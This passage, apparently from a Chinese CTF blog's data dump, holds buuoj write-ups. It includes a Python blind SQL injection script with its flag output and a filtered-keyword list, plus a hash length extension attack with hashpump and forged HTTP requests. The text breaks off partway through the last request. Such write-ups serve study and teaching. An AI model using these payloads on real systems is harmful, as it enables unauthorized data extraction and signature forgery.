如果表达式1的值为真，取表达式二的值，否者取表达式三的值</span><br><span class=\"line\">ascii(char)</span><br><span class=\"line\">substr（str,pos,len)</span><br></pre></td></tr></table></figure>\n<a id=\"more\"></a>\n\n<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;&#125; 里为 uuid</span><br></pre></td></tr></table></figure>\n\n<p>访问页面</p>\n<p><img src=\"/pic/3.jpg\" alt=\"\"></p>\n<p>使用burp suite进行sql fuzz测试，以下字符被过滤</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">%20</th>\n<th>482</th>\n<th>SQL Injection Checked</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">AND</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">DELETE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">END-EXEC</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">GROUP</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INSERT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INTO</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">LIMIT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">OR</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UNION</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UPDATE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">+</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">/</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">*</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">`</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">“</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">||</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;&amp;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">%23</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\"><code>if,substr,ascii,&lt;,&gt;,=,(),/t</code>都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用<code>/t、( )代替</code></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Time    : 12&#x2F;27&#x2F;2019 6:11 PM</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">url &#x3D; &quot;http:&#x2F;&#x2F;97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class=\"line\">result &#x3D; &#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">for x in range(1, 43):</span><br><span class=\"line\">    high &#x3D; 126</span><br><span class=\"line\">    low &#x3D; 45</span><br><span class=\"line\">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    while high - low &gt; 1:</span><br><span class=\"line\">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&quot; % (x, mid)</span><br><span class=\"line\">        data &#x3D; &#123;</span><br><span class=\"line\">            &quot;id&quot;: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        time.sleep(0.3)</span><br><span class=\"line\">        res &#x3D; requests.post(url, data &#x3D; data)</span><br><span class=\"line\">        if &#39;Hello&#39; in res.text:</span><br><span class=\"line\">            low &#x3D; mid</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            high &#x3D; mid</span><br><span class=\"line\">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class=\"line\"></span><br><span class=\"line\">    if high - low &#x3D;&#x3D; 1:</span><br><span class=\"line\">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%d,1,2)&quot; % (x, high)</span><br><span class=\"line\">        data &#x3D; &#123;</span><br><span class=\"line\">            &quot;id&quot;: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        response &#x3D; requests.post(url, data&#x3D;data)</span><br><span class=\"line\">        if &#39;Hello&#39; in response.text:</span><br><span class=\"line\">            result +&#x3D; chr(int(mid+1))</span><br><span class=\"line\">        else :</span><br><span class=\"line\">            result +&#x3D; chr(int(mid))</span><br><span class=\"line\">    else :</span><br><span class=\"line\">        result +&#x3D; chr(int(mid))</span><br><span class=\"line\">    print(result)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f</span><br><span class=\"line\">fl</span><br><span class=\"line\">fla</span><br><span class=\"line\">flag</span><br><span class=\"line\">flag&#123;</span><br><span class=\"line\">flag&#123;a</span><br><span class=\"line\">flag&#123;a2</span><br><span class=\"line\">flag&#123;a22</span><br><span class=\"line\">flag&#123;a22c</span><br><span class=\"line\">flag&#123;a22cf</span><br><span class=\"line\">flag&#123;a22cf6</span><br><span class=\"line\">flag&#123;a22cf69</span><br><span class=\"line\">flag&#123;a22cf690</span><br><span class=\"line\">flag&#123;a22cf690-</span><br><span class=\"line\">flag&#123;a22cf690-3</span><br><span class=\"line\">flag&#123;a22cf690-34</span><br><span class=\"line\">flag&#123;a22cf690-342</span><br><span class=\"line\">flag&#123;a22cf690-342a</span><br><span class=\"line\">flag&#123;a22cf690-342a-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-8</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-88</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df3</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df33</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d446</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4469</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。</p>\n","site":{"data":{}},"excerpt":"<h2 id=\"CISCN2019-华北赛区-Day2-Web1-Hack-World\"><a href=\"#CISCN2019-华北赛区-Day2-Web1-Hack-World\" class=\"headerlink\" title=\"[CISCN2019 华北赛区 Day2 Web1]Hack World\"></a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2><h3 id=\"0x00-基础\"><a href=\"#0x00-基础\" class=\"headerlink\" title=\"0x00 基础\"></a>0x00 基础</h3><p>SQL盲注，使用<code>if(表达式1，表达式2，表达式3)、ascii(char)、substr（str,pos,len）</code>函数一个一个的猜字符，过滤绕过，空格可以使用<code>+、\\t、/**/、()</code>绕过。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if(表达式1，表达式2，表达式3)  如果表达式1的值为真，取表达式二的值，否者取表达式三的值</span><br><span class=\"line\">ascii(char)</span><br><span class=\"line\">substr（str,pos,len)</span><br></pre></td></tr></table></figure>","more":"<h3 id=\"0x01-分析\"><a href=\"#0x01-分析\" class=\"headerlink\" title=\"0x01 分析\"></a>0x01 分析</h3><p>题目提示</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">flag&#123;&#125; 里为 uuid</span><br></pre></td></tr></table></figure>\n\n<p>访问页面</p>\n<p><img src=\"/pic/3.jpg\" alt=\"\"></p>\n<p>使用burp suite进行sql fuzz测试，以下字符被过滤</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">%20</th>\n<th>482</th>\n<th>SQL Injection Checked</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">AND</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">DELETE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">END-EXEC</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">GROUP</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INSERT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">INTO</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">LIMIT</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">OR</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UNION</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">UPDATE</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">+</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">/</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">-</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">*</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">`</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">“</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">||</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">&amp;&amp;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">%23</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\">;</td>\n<td>482</td>\n<td>SQL Injection Checked</td>\n</tr>\n<tr>\n<td align=\"center\"><code>if,substr,ascii,&lt;,&gt;,=,(),/t</code>都没有被过滤，可以使用盲注,编写脚本，空格被过滤使用<code>/t、( )代替</code></td>\n<td></td>\n<td></td>\n</tr>\n</tbody></table>\n<h3 id=\"0x02-开始操作\"><a href=\"#0x02-开始操作\" class=\"headerlink\" title=\"0x02 开始操作\"></a>0x02 开始操作</h3><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># -*- coding: utf-8 -*-</span><br><span class=\"line\"># @Time    : 12&#x2F;27&#x2F;2019 6:11 PM</span><br><span class=\"line\">import requests</span><br><span class=\"line\">import time</span><br><span class=\"line\"></span><br><span class=\"line\">url &#x3D; &quot;http:&#x2F;&#x2F;97d580f3-633c-469e-826c-3e251279ebba.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class=\"line\">result &#x3D; &#39;&#39;</span><br><span class=\"line\"></span><br><span class=\"line\">for x in range(1, 43):</span><br><span class=\"line\">    high &#x3D; 126</span><br><span class=\"line\">    low &#x3D; 45</span><br><span class=\"line\">    mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    while high - low &gt; 1:</span><br><span class=\"line\">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&gt;%d,1,2)&quot; % (x, mid)</span><br><span class=\"line\">        data &#x3D; &#123;</span><br><span class=\"line\">            &quot;id&quot;: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        time.sleep(0.3)</span><br><span class=\"line\">        res &#x3D; requests.post(url, data &#x3D; data)</span><br><span class=\"line\">        if &#39;Hello&#39; in res.text:</span><br><span class=\"line\">            low &#x3D; mid</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            high &#x3D; mid</span><br><span class=\"line\">        mid &#x3D; (low + high) &#x2F;&#x2F; 2</span><br><span class=\"line\"></span><br><span class=\"line\">    if high - low &#x3D;&#x3D; 1:</span><br><span class=\"line\">        payload &#x3D; &quot;if(ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%d,1,2)&quot; % (x, high)</span><br><span class=\"line\">        data &#x3D; &#123;</span><br><span class=\"line\">            &quot;id&quot;: payload</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        response &#x3D; requests.post(url, data&#x3D;data)</span><br><span class=\"line\">        if &#39;Hello&#39; in response.text:</span><br><span class=\"line\">            result +&#x3D; chr(int(mid+1))</span><br><span class=\"line\">        else :</span><br><span class=\"line\">            result +&#x3D; chr(int(mid))</span><br><span class=\"line\">    else :</span><br><span class=\"line\">        result +&#x3D; chr(int(mid))</span><br><span class=\"line\">    print(result)</span><br></pre></td></tr></table></figure>\n\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">f</span><br><span class=\"line\">fl</span><br><span class=\"line\">fla</span><br><span class=\"line\">flag</span><br><span class=\"line\">flag&#123;</span><br><span class=\"line\">flag&#123;a</span><br><span class=\"line\">flag&#123;a2</span><br><span class=\"line\">flag&#123;a22</span><br><span class=\"line\">flag&#123;a22c</span><br><span class=\"line\">flag&#123;a22cf</span><br><span class=\"line\">flag&#123;a22cf6</span><br><span class=\"line\">flag&#123;a22cf69</span><br><span class=\"line\">flag&#123;a22cf690</span><br><span class=\"line\">flag&#123;a22cf690-</span><br><span class=\"line\">flag&#123;a22cf690-3</span><br><span class=\"line\">flag&#123;a22cf690-34</span><br><span class=\"line\">flag&#123;a22cf690-342</span><br><span class=\"line\">flag&#123;a22cf690-342a</span><br><span class=\"line\">flag&#123;a22cf690-342a-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-8</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-88</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df3</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df33</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d446</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d4469</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d</span><br><span class=\"line\">flag&#123;a22cf690-342a-4bf4-885b-df332d44698d&#125;</span><br></pre></td></tr></table></figure>\n\n<p>因为平台有访问频率限制，导致之前很多次都不成功，加入时间模块稍微延迟一下即可。</p>"},{"title":"Hello World","date":"2019-12-19T12:49:28.000Z","_content":"\n第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移\n\n","source":"_posts/hello-world.md","raw":"---\ntitle: Hello World\ndate: 2019-12-19 20:49:28\n---\n\n第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移\n\n","slug":"hello-world","published":1,"updated":"2019-12-27T03:47:02.604Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck4pc9e4x0006187ec60kfj7r","content":"<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>\n","site":{"data":{}},"excerpt":"","more":"<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>\n"},{"title":"buuoj刷题记录4","date":"2019-12-28T13:16:16.000Z","_content":"## [De1CTF 2019]SSRF Me\n\n### 0x00 基础\n\n大致了解flask框架，[CVE-2019-9948](http://www.security-database.com/detail.php?alert=CVE-2019-9948)：`urlopen（）可包含本地文件`，[哈希长度扩展攻击](https://www.freebuf.com/articles/web/31756.html) 。\n\n<!--more-->\n\n### 0x01 分析\n\n题目提示 `flag在./flag.txt中`。\n\n打开链接查看源码，在buuoj的复现过程中，查看源码只拿到一行，需要自己一个一个的敲回车改格式。\n\n\n```python\n#! /usr/bin/env python\n#encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if(not os.path.exists(self.sandbox)):          #SandBox For Remote_Addr\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print(resp)\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):  #对secert_key、param、action进行MD5运算  的结果与self.sign作比较\n            return True\n        else:\n            return False\n\n#generate Sign For Action Scan.\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))  # urllib.unquote 相当与  urldecode\n    action = \"scan\"\n    return getSign(action, param)\n\n@app.route('/De1ta',methods=['GET','POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if(waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n@app.route('/')\ndef index():\n    return open(\"code.txt\",\"r\").read()\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest() #对secert_key、param、action进行MD5摘要签名\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\ndef waf(param):\n    check=param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0',port=80)\n```\n\n分析代码，总共三条路由，`@app.route('/')`显示代码，`@app.route(\"/geneSign\", methods=['GET', 'POST'])`生成签名，`@app.route('/De1ta',methods=['GET','POST'])`获取参数并执行`Exec()`函数\n\n大概思路就是在 /De1ta 中 get param ，cookie action sign 去读取 flag.txt，其中，`param=flag.txt`，`action` 中要含有 `read` 和 `scan`，且 `sign=md5(secert_key + param + action)`\n\n在`getSign`函数中，生成MD5签名的方式是`secert_key + param + action`其中`action=scan`，`secert_key`未知`param`可以控制。\n\n在`@app.route('/De1ta',methods=['GET','POST'])`中，`cookies`中的`action`必须为`readscan`，sign为\n\n`secert_key + param + scan`签名后的md5，使`param=flag.txtread`直接获取到签名后的md5。\n\n### 0x02 开始操作\n\n先获取到签名后的md5\n\n访问`http://35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn/geneSign?param=flag.txtread`\n\n返回为`0155303824bd0738b4ed0a52b7446c08`\n\n\n```\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 35905e74-da20-4673-b384-8c4686fa85c2.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 1\nCookie: action=readscan; sign=0155303824bd0738b4ed0a52b7446c08 \n```\n\n结果\n\n`{\"code\": 200, \"data\": \"flag{04726554-0f9f-47f4-9c1a-114e21e68594}\\n\"}`\n\n### 0x02 另一种解法\n\n使用hashdump 利用哈希长度扩展攻击，\n\n已知`（secret+flag.txt+scan）=40ad0bf20e771e768e9305810410c1b9`\n\n求`（secret+flag.txt+scanread）`\n\n经过测试密钥是16位 加上scanread是24位。\n\n```\nroot@kali:/tmp/HashPump# hashpump \nInput Signature: 40ad0bf20e771e768e9305810410c1b9\nInput Data: scan   #写上原有数据\nInput Key Length: 24    #密钥长度+数据长度+拓展的数据长度\nInput Data to Add: read   #拓展的数据\n46a6ff04f7bede58de30e93410935976 #生成的MD5\nscan\\x80\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\xe0\\x00\\x00\\x00\\x00\\x00\\x00\\x00read \n```\n\n`burp suite`提交的数据\n\n```\nGET /De1ta?param=flag.txt HTTP/1.1\nHost: 6e84dbce-e560-4f27-86f2-54cb202c45fe.node3.buuoj.cn\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nUpgrade-Insecure-Requests: 